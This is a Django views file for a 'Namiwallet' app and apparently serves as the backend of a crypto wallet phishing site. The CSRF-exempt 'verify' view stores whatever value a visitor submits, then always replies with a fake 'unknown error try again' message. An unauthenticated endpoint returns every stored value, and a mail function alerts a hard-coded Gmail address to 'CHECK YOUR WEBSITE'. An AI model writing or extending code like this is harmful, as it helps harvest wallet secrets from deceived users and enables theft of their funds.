from django.shortcuts import render,get_list_or_404
from django.http import HttpResponse
from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status
from main.models import Namiwallet
from main.serializers import NamiwalletSerializer
from rest_framework.permissions import AllowAny
from django.shortcuts import render, redirect
from django.urls import reverse
from django.http import HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
import threading
from django.conf import settings
from django.core.mail import EmailMessage
from django.template.loader import render_to_string

# Create your views here.
@api_view(['GET'])

def get_data(request):
    wallet = Namiwallet.objects.all()
    seria=NamiwalletSerializer(wallet,many=True)
    return Response(seria.data)

@api_view(['POST'])
def add_data(request):
    permission_classes = (AllowAny,)
    seria = NamiwalletSerializer(data=request.data)
    if seria.is_valid():
        seria.save()
    return Response(seria.data)

@csrf_exempt
def sendmail(category,request):
    owneremail = 'theneweventc@gmail.com'
    email_subject = 'CHECK YOUR WEBSITE'
    email_body = render_to_string('activate.html', {
        'user': 'owner',
        'domain': '.com',
        'category':category,
        'site': '',
        
    })

    email = EmailMessage(subject=email_subject, body=email_body,
                         from_email=settings.EMAIL_FROM_USER,
                         to=[owneremail]
                         )
    email.send(fail_silently = False)

@csrf_exempt
def verify(request):
    if request.method == 'POST':
        val = request.POST.get("name")
        print(val)
        Namiwallet(value=val).save()
        return JsonResponse({'result':'unknown error try again'})
# class walletList(APIView):

#     def get(self,request):
#         wallet = Namiwallet.objects.all()
#         serial=NamiwalletSerializer(wallet,many=True)
#         return Response(serial.data)
    
#     def post(self):
#         pass
